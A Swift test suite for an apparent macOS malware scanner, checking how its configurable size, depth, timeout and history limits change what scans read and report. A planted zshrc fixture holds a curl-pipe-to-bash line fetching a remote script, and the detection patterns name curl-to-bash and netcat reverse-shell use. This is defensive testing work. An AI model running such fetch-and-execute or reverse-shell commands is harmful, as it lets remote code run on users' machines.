import Foundation
import Testing
@testable import BluehatCore

struct ScanLimitsBehaviourTests {
    static let gitLensManifestBytes = 1_091_575

    let temporaryRoot = FileManager.default.temporaryDirectory.appending(path: "bluehat-limits-\(UUID().uuidString)")

    var root: String {
        VolumeWalk.canonical(temporaryRoot.path) ?? temporaryRoot.path
    }

    init() throws {
        try FileManager.default.createDirectory(at: temporaryRoot, withIntermediateDirectories: true)
    }

    func cleanUp() {
        try? FileManager.default.removeItem(at: temporaryRoot)
    }

    @discardableResult
    func write(_ text: String, to relativePath: String, paddedTo size: Int? = nil, padding: UInt8 = UInt8(ascii: " ")) throws -> String {
        let url = temporaryRoot.appending(path: relativePath)
        try FileManager.default.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
        var data = Data(text.utf8)
        if let size { data.append(Data(repeating: padding, count: size - data.count)) }
        try data.write(to: url)
        return "\(root)/\(relativePath)"
    }

    func writeSparse(sized size: Int, to relativePath: String) throws {
        try write("", to: relativePath)
        #expect(truncate("\(root)/\(relativePath)", off_t(size)) == 0)
    }

    func rule(_ check: CheckKind, id: String = "limits.rule", severity: Severity = .high, patterns: [String]? = nil, packages: [MaliciousPackage]? = nil, files: [String]? = nil) -> Rule {
        Rule(id: id, title: id, severity: severity, category: .malware, check: check, patterns: patterns, paths: nil, ports: nil, hashes: nil, setting: nil, product: nil, advisory: nil, ranges: nil, packages: packages, files: files, teams: nil, bundles: nil, minimumVersion: nil, hosts: nil, summary: nil, remedy: nil, references: nil)
    }

    func packageRule() -> Rule {
        rule(.npmPackage, packages: [MaliciousPackage(name: "chalk", versions: .only(["5.6.1"]), advisory: "MAL-1")])
    }

    func manifest(_ name: String) -> String {
        #"{"name": "\#(name)", "version": "1.0.0"}"#
    }

    func deepScan(_ rules: [Rule], limits: ScanLimits) -> (findings: [Finding], notices: [String], notScanned: NotScannedList) {
        let notScanned = NotScannedCollector(limits: limits)
        let result = Scanner(kind: .deep, limits: limits, walkRoots: [root]).walkDisk(rules: rules, reported: [], notScanned: notScanned, onItemsWalked: { _ in })
        return (result.findings, result.notices, notScanned.finished())
    }

    @Test func aRaisedLimitLetsADeepScanReadTheOversizedManifest() throws {
        defer { cleanUp() }
        try write(#"{"name": "gitlens", "version": "1.0.0", "x": "evil"}"#, to: "ext/package.json", paddedTo: Self.gitLensManifestBytes)
        let rules = [rule(.projectFile, patterns: ["evil"], files: ["package.json"])]

        let atDefault = deepScan(rules, limits: .defaults)
        #expect(atDefault.findings.isEmpty)
        #expect(atDefault.notScanned.entries.contains { $0.reason == .overSizeLimit && $0.name.contains("ext/package.json") })

        let raised = try #require(ScanLimits.defaults.setting(.maxManifestBytes, to: 1_100_000))
        let result = deepScan(rules, limits: raised)
        #expect(result.findings.map(\.rule.id) == ["limits.rule"])
        #expect(result.notScanned.totalsByReason[.overSizeLimit] == nil)
    }

    @Test func aRaisedLimitLetsTheNormalScanReadAGlobalPackagesManifest() throws {
        defer { cleanUp() }
        try write(manifest("gitlens"), to: "lib/node_modules/gitlens/package.json", paddedTo: Self.gitLensManifestBytes)
        let modules = "\(root)/lib/node_modules"

        #expect(NpmInventory.packages(inProjects: [], moduleDirectories: [modules]).packages.isEmpty)
        let raised = try #require(ScanLimits.defaults.setting(.maxManifestBytes, to: 1_100_000))
        #expect(NpmInventory.packages(inProjects: [], moduleDirectories: [modules], limits: raised).packages.map(\.name) == ["gitlens"])
    }

    @Test func aLoweredLockfileLimitSkipsAndNamesTheFile() throws {
        defer { cleanUp() }
        try write("{}", to: "app/package.json")
        try writeSparse(sized: 6_000_000, to: "app/yarn.lock")
        let projects = [(path: "\(root)/app", files: Set(["package.json", "yarn.lock"]))]

        #expect(NpmInventory.packages(inProjects: projects, moduleDirectories: []).notScanned.isEmpty)
        let lowered = try #require(ScanLimits.defaults.setting(.maxLockfileBytes, to: 5_000_000))
        let entry = try #require(NpmInventory.packages(inProjects: projects, moduleDirectories: [], limits: lowered).notScanned.first)
        #expect(entry.path == "\(root)/app/yarn.lock")
        #expect(entry.explanation == "Over the size limit (6 MB, limit 5 MB)")
    }

    @Test func aRaisedReadLimitReachesTextPastTheOldEnd() throws {
        defer { cleanUp() }
        let filler = String(repeating: "# padding\n", count: 110_000)
        let profile = try write(filler + "curl http://x.example/i.sh | bash\n", to: "zshrc")
        let rules = [rule(.shellProfile, patterns: [#"curl.*\|\s*bash"#])]

        let atDefault = Scanner.shellProfileFindings(rules, files: [profile])
        #expect(atDefault.findings.isEmpty)
        #expect(atDefault.notScanned.count == 1)

        let raised = try #require(ScanLimits.defaults.setting(.maxReadBytes, to: 2_000_000))
        let result = Scanner.shellProfileFindings(rules, files: [profile], limits: raised)
        #expect(result.findings.count == 1)
        #expect(result.notScanned.isEmpty)
    }

    @Test func aLoweredExtensionIndexLimitSkipsTheList() throws {
        defer { cleanUp() }
        try write(#"{"addons": []}"#, to: "profile/extensions.json", paddedTo: 2_000_000)

        #expect(Scanner.firefoxExtensions(profilesRoot: root).notScanned.isEmpty)
        let lowered = try #require(ScanLimits.defaults.setting(.maxExtensionIndexBytes, to: 1_000_000))
        #expect(Scanner.firefoxExtensions(profilesRoot: root, limits: lowered).notScanned.map(\.path) == ["\(root)/profile/extensions.json"])
    }

    @Test func theMatchedLengthDecidesWhatARuleSeesAndWhatTheEntrySays() throws {
        let padding = String(repeating: "x", count: ScanLimits.defaults[.maxMatchedLength])
        let regexes = Scanner.regexes(["evil-marker"])
        let raised = try #require(ScanLimits.defaults.setting(.maxMatchedLength, to: 16_384))

        #expect(!Scanner.matches(regexes, padding + "evil-marker"))
        #expect(Scanner.matches(regexes, padding + "evil-marker", limits: raised))
        #expect(!Scanner.isLongerThanMatched(padding + "evil-marker", limits: raised))
        #expect(Scanner.longLineEntries("Check", paths: ["/a"], limits: raised).map(\.explanation) == ["Only the first \(16_384.formatted()) characters of very long lines were matched (Check)"])
    }

    @Test func aBacktrackingPatternAtTheLongestMatchedLengthStillFinishesQuickly() throws {
        let longest = try #require(ScanLimits.defaults.setting(.maxMatchedLength, to: ScanLimit.maxMatchedLength.range.upperBound))
        let regexes = Scanner.regexes([#"\bn(c|cat)\b.*\s-(e|c)\s"#])
        let line = String(repeating: "nc ", count: ScanLimit.maxMatchedLength.range.upperBound)
        let clock = ContinuousClock()
        let elapsed = clock.measure { #expect(!Scanner.matches(regexes, line, limits: longest)) }
        #expect(elapsed < .seconds(15))
    }

    @Test func theDependencyDepthDecidesHowFarAnOldLockfileIsFollowed() throws {
        var json = #"{"version": "1.0.0"}"#
        for _ in 0..<40 {
            json = #"{"version": "1.0.0", "dependencies": {"a": \#(json)}}"#
        }
        let data = Data(#"{"dependencies": {"a": \#(json)}}"#.utf8)
        let lowered = try #require(ScanLimits.defaults.setting(.maxDependencyDepth, to: 8))
        let raised = try #require(ScanLimits.defaults.setting(.maxDependencyDepth, to: 128))

        #expect(try NpmInventory.packageLockPackages(data).count == 32)
        #expect(try NpmInventory.packageLockPackages(data, limits: lowered).count == 8)
        #expect(try NpmInventory.packageLockPackages(data, limits: raised).count == 41)
    }

    @Test func aRaisedHashSizeFingerprintsALargerFile() throws {
        defer { cleanUp() }
        try writeSparse(sized: 60_000_000, to: "large.bin")

        #expect(Scanner.hashedFiles(in: [root]).hashes.isEmpty)
        let raised = try #require(ScanLimits.defaults.setting(.maxHashedFileBytes, to: 70_000_000))
        #expect(Scanner.hashedFiles(in: [root], limits: raised).hashes.count == 1)
    }

    @Test func theHashDepthDecidesHowDeepFingerprintsGo() throws {
        defer { cleanUp() }
        let deep = (1...10).map { "d\($0)" }.joined(separator: "/")
        try write("abc", to: "\(deep)/deep.bin")

        #expect(Scanner.hashedFiles(in: [root]).hashes.isEmpty)
        let raised = try #require(ScanLimits.defaults.setting(.maxHashDepth, to: 12))
        #expect(Scanner.hashedFiles(in: [root], limits: raised).hashes.count == 1)
    }

    @Test func theProjectDepthDecidesWhichProjectsAreFound() throws {
        defer { cleanUp() }
        let deep = (1...8).map { "d\($0)" }.joined(separator: "/")
        try write("{}", to: "\(deep)/package.json")
        try write("{}", to: "shallow/package.json")
        try write("{}", to: "a/b/c/package.json")
        let names = NpmInventory.projectFileNames
        func found(_ limits: ScanLimits) -> Int {
            ProjectFolders.directories(in: [root], containing: names, limits: limits).directories.count
        }

        #expect(found(.defaults) == 2)
        #expect(found(try #require(ScanLimits.defaults.setting(.maxProjectDepth, to: 16))) == 3)
        #expect(found(try #require(ScanLimits.defaults.setting(.maxProjectDepth, to: 2))) == 1)
    }

    @Test func theFolderAndFileNameBudgetsComeFromTheLimits() throws {
        defer { cleanUp() }
        try write("{}", to: "a/package.json")
        try write("x", to: "a/one.txt")
        try write("{}", to: "b/package.json")
        let names = NpmInventory.projectFileNames

        let folders = ProjectFolders.directories(in: [root], containing: names, limits: ScanLimits(unchecked: [.maxFoldersPerProjectFolder: 1]))
        #expect(folders.notScanned.first?.explanation.contains("the first 1 folders") == true)
        let fileNames = ProjectFolders.directories(in: [root], containing: names, limits: ScanLimits(unchecked: [.maxFileNamesPerProjectFolder: 1]))
        #expect(fileNames.notScanned.first?.explanation.contains("the first 1 file names") == true)
    }

    @Test func theModuleDepthDecidesHowFarGlobalPackagesAreFollowed() throws {
        defer { cleanUp() }
        var path = "lib/node_modules"
        for level in 0..<5 {
            path += "/p\(level)"
            try write(manifest("p\(level)"), to: "\(path)/package.json")
            path += "/node_modules"
        }
        let modules = "\(root)/lib/node_modules"

        #expect(NpmInventory.packages(inProjects: [], moduleDirectories: [modules]).packages.count == 5)
        let lowered = try #require(ScanLimits.defaults.setting(.maxModuleDepth, to: 2))
        #expect(NpmInventory.packages(inProjects: [], moduleDirectories: [modules], limits: lowered).packages.count == 3)
    }

    @Test func theGlobalPackageBudgetComesFromTheLimits() throws {
        defer { cleanUp() }
        for name in ["a", "b"] {
            try write(manifest(name), to: "lib/node_modules/\(name)/package.json")
        }
        let inventory = NpmInventory.packages(inProjects: [], moduleDirectories: ["\(root)/lib/node_modules"], limits: ScanLimits(unchecked: [.maxGlobalPackages: 1]))
        #expect(inventory.packages.count == 1)
        #expect(inventory.notScanned.first?.explanation.contains("only the first 1 global packages") == true)
    }

    @Test func aScansSignatureChecksUseItsLimits() throws {
        let limits = try #require(ScanLimits.defaults.setting(.signatureOpenTimeout, to: 5)?.setting(.signatureCheckTimeout, to: 600)?.setting(.maxStuckPathsPerScan, to: 1))
        let checks = Scanner(limits: limits).signatureChecks
        #expect(checks.openLimit == 5)
        #expect(checks.checkLimit == 600)
        #expect(checks.maxStuckPaths == 1)
        let atDefault = SignatureChecks()
        #expect(atDefault.openLimit == 20)
        #expect(atDefault.checkLimit == 300)
        #expect(atDefault.maxStuckPaths == 5)
    }

    @Test func oneStuckItemStopsTheChecksWhenTheLimitIsOne() throws {
        defer { cleanUp() }
        let trap = temporaryRoot.appending(path: "trap.app")
        #expect(mkfifo(trap.path, 0o600) == 0)
        let checks = SignatureChecks(openLimit: 0.2, checkLimit: 0.2, maxStuckPaths: ScanLimit.maxStuckPathsPerScan.range.lowerBound)
        _ = Scanner.signatureProblem(at: trap, checks: checks)
        #expect(checks.stuckPaths == [trap.path])
        #expect(Scanner.signatureProblem(at: temporaryRoot.appending(path: "other.app"), checks: checks) == nil)
        #expect(checks.skippedPaths == [temporaryRoot.appending(path: "other.app").path])
        let releasedTrap = open(trap.path, O_WRONLY | O_NONBLOCK)
        if releasedTrap >= 0 { close(releasedTrap) }
    }

    @Test func theAssessmentLimitDecidesHowManyAppsGatekeeperIsAsked() throws {
        defer { cleanUp() }
        let apps = (1...8).map { (path: "/Applications/App\($0).app", team: "TEAM", cdhash: "hash\($0)", isNotarized: false) }
        func asked(_ limits: ScanLimits) -> Int {
            var cache = NotarizationCache(fileURL: temporaryRoot.appending(path: "\(UUID().uuidString).json"))
            var count = 0
            _ = Scanner.notarizationFindings([rule(.notarization)], apps: apps, cache: &cache, limits: limits) { _ in
                count += 1
                return true
            }
            return count
        }
        #expect(asked(.defaults) == 5)
        #expect(asked(try #require(ScanLimits.defaults.setting(.maxNotarizationAssessments, to: 1))) == 1)
        #expect(asked(try #require(ScanLimits.defaults.setting(.maxNotarizationAssessments, to: 7))) == 7)
    }

    @Test func aLoweredCacheLimitIgnoresALargerCache() throws {
        defer { cleanUp() }
        let path = try write(#"{"/Applications/A.app": {"cdhash": "abc", "isNotarized": true}}"#, to: "notarization.json", paddedTo: 2_000_000)
        let url = URL(fileURLWithPath: path)

        #expect(NotarizationCache(fileURL: url).isNotarized(path: "/Applications/A.app", cdhash: "abc") == true)
        let lowered = try #require(ScanLimits.defaults.setting(.maxNotarizationCacheBytes, to: 1_000_000))
        #expect(NotarizationCache(fileURL: url, limits: lowered).verdicts.isEmpty)
    }

    @Test func aToolStopsAtTheLimitsTimeUnlessTheCallerPassesItsOwn() {
        let shortTime = ScanLimits(unchecked: [.toolTimeout: 1, .toolKillDelay: 1])
        let clock = ContinuousClock()
        let stopped = clock.measure { #expect(Scanner.runTool("/bin/sleep", ["5"], limits: shortTime).isEmpty) }
        #expect(stopped < .seconds(4))
        #expect(Scanner.runTool("/bin/sh", ["-c", "sleep 2; echo done"], timeout: 8, limits: shortTime) == "done\n")
    }

    @Test func aToolThatIgnoresTerminationIsKilledAfterTheLimitsDelay() {
        let limits = ScanLimits(unchecked: [.toolTimeout: 1, .toolKillDelay: 2])
        let clock = ContinuousClock()
        let stopped = clock.measure {
            #expect(Scanner.runTool("/bin/sh", ["-c", "trap '' TERM; while :; do /bin/sleep 0.05; done"], limits: limits).isEmpty)
        }
        #expect(stopped >= .seconds(3))
        #expect(stopped < .seconds(7))
    }

    @Test func aLoweredFindingsLimitKeepsFewerAndSaysSo() throws {
        defer { cleanUp() }
        for index in 0..<103 {
            try write("evil", to: "\(index).config.js")
        }
        let lowered = try #require(ScanLimits.defaults.setting(.maxFindings, to: 100))
        let result = deepScan([rule(.projectFile, patterns: ["evil"], files: ["*.config.js"])], limits: lowered)
        #expect(result.findings.count == 100)
        #expect(result.notices.contains { $0.hasPrefix("Deep Scan kept the 100 most severe matches on the disk and left out 3 more") })
    }

    @Test func theRecordLimitDecidesHowManyScansAreKept() throws {
        defer { cleanUp() }
        let url = temporaryRoot.appending(path: "history.json")
        var history = ScanHistory(fileURL: url)
        let raised = try #require(ScanLimits.defaults.setting(.maxHistoryRecords, to: 40))
        for index in 0..<35 {
            try history.append(ScanRecord(date: .now, rulesVersion: index, duration: 1, findings: []), limits: raised)
        }
        #expect(history.records.count == 35)
        #expect(ScanHistory(fileURL: url, limits: raised).records.count == 35)

        let lowered = try #require(ScanLimits.defaults.setting(.maxHistoryRecords, to: 5))
        try history.append(ScanRecord(date: .now, rulesVersion: 99, duration: 1, findings: []), limits: lowered)
        #expect(ScanHistory(fileURL: url).records.map(\.rulesVersion) == [99, 34, 33, 32, 31])
    }

    func historyFinding(_ detail: String) -> Finding {
        Finding(rule: rule(.path), detail: detail, path: nil)
    }

    @Test func loweringTheHistoryFileLimitKeepsPastScansUntilTheNextScanTrimsThem() throws {
        defer { cleanUp() }
        let url = temporaryRoot.appending(path: "history.json")
        var history = ScanHistory(fileURL: url)
        let findings = (0..<8_000).map { historyFinding("detail \($0) " + String(repeating: "x", count: 150)) }
        for version in 1...2 {
            try history.append(ScanRecord(date: .now, rulesVersion: version, duration: 1, findings: findings))
        }
        let lowered = try #require(ScanLimits.defaults.setting(.maxHistoryFileBytes, to: 1_000_000))

        var reloaded = ScanHistory(fileURL: url, limits: lowered)
        #expect(reloaded.records.count == 2)

        try reloaded.append(ScanRecord(date: .now, rulesVersion: 3, duration: 1, findings: []), limits: lowered)
        #expect(reloaded.records.map(\.rulesVersion) == [3])
    }

    @Test func aHistoryFileOverTheDefaultIsReadOnlyWhenTheLimitIsRaised() throws {
        defer { cleanUp() }
        let saved = #"[{"id":"7D8F2B60-0D5C-4F6E-9A55-1C7A1F3B9E10","date":"2026-11-01T10:00:00Z","rulesVersion":3,"duration":1.5,"entries":[]}]"#
        let path = try write(saved, to: "history.json", paddedTo: 21_000_000)
        let url = URL(fileURLWithPath: path)

        #expect(ScanHistory(fileURL: url).records.isEmpty)
        let raised = try #require(ScanLimits.defaults.setting(.maxHistoryFileBytes, to: 30_000_000))
        #expect(ScanHistory(fileURL: url, limits: raised).records.map(\.rulesVersion) == [3])
    }

    @Test func savedHistoryStillDecodesWithChangedLimits() throws {
        defer { cleanUp() }
        let saved = #"[{"id":"7D8F2B60-0D5C-4F6E-9A55-1C7A1F3B9E10","date":"2026-11-01T10:00:00Z","rulesVersion":3,"duration":1.5,"entries":[{"ruleID":"a","title":"A","severity":"high","detail":"d"}],"kind":"full"}]"#
        let path = try write(saved, to: "history.json")
        let limits = try #require(ScanLimits.defaults.setting(.maxHistoryRecords, to: 5)?.setting(.maxDetailLength, to: 100))
        let history = ScanHistory(fileURL: URL(fileURLWithPath: path), limits: limits)
        #expect(history.records.map(\.rulesVersion) == [3])
        #expect(history.records.first?.kind == .deep)
        #expect(history.records.first?.issues.count == 1)
    }

    @Test func theDetailLimitClipsDetailsButNotTheFingerprint() throws {
        let long = String(repeating: "a", count: 500)
        let raised = try #require(ScanLimits.defaults.setting(.maxDetailLength, to: 400))
        let usual = Finding(rule: rule(.path), detail: long, path: nil)
        let longer = Finding(rule: rule(.path), detail: long, path: nil, limits: raised)
        #expect(usual.detail.count == 201)
        #expect(longer.detail.count == 401)
        #expect(longer.fingerprint == usual.fingerprint)
    }

    @Test func aCheckClipsItsFindingsWithTheLimitsItWasGiven() throws {
        let lowered = try #require(ScanLimits.defaults.setting(.maxDetailLength, to: 100))
        let line = "evil " + String(repeating: "a", count: 300)
        let findings = Scanner.matchingLines([line], rules: [rule(.process, patterns: ["evil"])], limits: lowered)
        #expect(findings.first?.detail.count == 101)
    }

    @Test func theNoticePathLimitDecidesHowManyPathsAreNamed() throws {
        let paths = (1...6).map { "/tmp/p\($0)" }
        let raised = try #require(ScanLimits.defaults.setting(.maxNoticePaths, to: 5))
        let lowered = try #require(ScanLimits.defaults.setting(.maxNoticePaths, to: 1))

        #expect(Scanner.pathList(paths) == "/tmp/p1, /tmp/p2, /tmp/p3 and 3 more")
        #expect(Scanner.pathList(paths, limits: raised) == "/tmp/p1, /tmp/p2, /tmp/p3, /tmp/p4, /tmp/p5 and 1 more")
        #expect(Scanner.pathList(paths, limits: lowered) == "/tmp/p1 and 5 more")
        #expect(Scanner.pathList(paths, limits: lowered, namingAll: true) == paths.joined(separator: ", "))
    }

    @Test func excludedFoldersAreAllNamedHoweverLowTheLimit() throws {
        defer { cleanUp() }
        let lowered = try #require(ScanLimits.defaults.setting(.maxNoticePaths, to: 1))
        let walk = VolumeWalk(roots: [root], excludedFolders: ["\(root)/a", "\(root)/b", "\(root)/c"], limits: lowered)
        let notice = try #require(walk.exclusionSummary)
        #expect(!notice.contains("more"))
        #expect(notice.contains("/c"))
    }

    @Test func aScanWithChangedLimitsSaysSoFirstAndFindsTheSameThings() throws {
        defer { cleanUp() }
        try write("evil", to: "a.config.js")
        let rulebook = Rulebook(schema: 1, version: 1, rules: [rule(.projectFile, patterns: ["evil"], files: ["*.config.js"])], issued: nil, expires: nil)
        let changed = try #require(ScanLimits.defaults.setting(.maxLockfileBytes, to: 5_000_000)?.setting(.maxReadBytes, to: 2_000_000))

        let usual = Scanner(kind: .deep, walkRoots: [root]).scan(rulebook)
        let result = Scanner(kind: .deep, limits: changed, walkRoots: [root]).scan(rulebook)

        #expect(usual.notices.first != changed.changedNotice)
        #expect(!usual.notices.contains { $0.contains("Settings › Limits") })
        #expect(result.notices.first == changed.changedNotice)
        #expect(result.findings.map(\.fingerprint) == usual.findings.map(\.fingerprint))
        #expect(result.findings.count == 1)
        #expect(ScanRecord(date: .now, rulesVersion: 1, duration: 1, findings: result.findings, kind: .deep).issues.map(\.ruleID) == ["limits.rule"])
    }

    @Test func aCleanScanWithLoweredLimitsStaysClean() throws {
        defer { cleanUp() }
        let rulebook = Rulebook(schema: 1, version: 1, rules: [rule(.projectFile, patterns: ["evil"], files: ["*.config.js"])], issued: nil, expires: nil)
        let lowered = try #require(ScanLimits.defaults.setting(.maxReadBytes, to: 250_000))
        let result = Scanner(limits: lowered).scan(rulebook)
        #expect(result.findings.isEmpty)
        #expect(result.notices == [lowered.changedNotice])
    }

    @Test func aCancelledScanStillNamesChangedLimits() throws {
        let cancellation = ScanCancellation()
        cancellation.cancel()
        let lowered = try #require(ScanLimits.defaults.setting(.maxReadBytes, to: 250_000))
        let rulebook = Rulebook(schema: 1, version: 1, rules: [], issued: nil, expires: nil)
        #expect(Scanner(limits: lowered, cancellation: cancellation).scan(rulebook).notices == [lowered.changedNotice])
    }

    @Test func theTrustChainKeepsItsOwnFixedLimits() {
        #expect(AppUpdater.maxImageBytes == 50_000_000)
        #expect(AppInstaller.toolTimeout == 120)
        #expect(RuleFeed.rulebook.maxEnvelopeBytes == 2_000_000)
        #expect(RuleFeed.malwareFeed.maxEnvelopeBytes == 4_000_000)
        #expect(!ScanLimit.all.contains { $0.key.lowercased().contains("update") || $0.key.lowercased().contains("feed") || $0.key.lowercased().contains("envelope") })
    }

    @Test func raisingTheFingerprintSizeDoesNotWidenTheUpdateImageCap() throws {
        defer { cleanUp() }
        try writeSparse(sized: AppUpdater.maxImageBytes + 1, to: "update.dmg")
        let file = temporaryRoot.appending(path: "update.dmg")
        #expect(Scanner.sha256(of: file, maxBytes: AppUpdater.maxImageBytes) == nil)
        #expect(Scanner.sha256(of: file, maxBytes: AppUpdater.maxImageBytes + 1) != nil)
    }

    @Test func aDeepLockfileAtTheLargestDepthCannotOverflowASecondaryThreadsStack() throws {
        let depth = ScanLimit.maxDependencyDepth.range.upperBound
        var json = #"{"version": "1.0.0"}"#
        for _ in 0..<depth {
            json = #"{"version": "1.0.0", "dependencies": {"a": \#(json)}}"#
        }
        let data = Data(#"{"dependencies": {"a": \#(json)}}"#.utf8)
        let limits = try #require(ScanLimits.defaults.setting(.maxDependencyDepth, to: depth))
        let finished = DispatchSemaphore(value: 0)
        let thread = Thread {
            _ = try? NpmInventory.packageLockPackages(data, limits: limits)
            finished.signal()
        }
        thread.stackSize = 1 << 19
        thread.start()
        #expect(finished.wait(timeout: .now() + 30) == .success)
    }
}
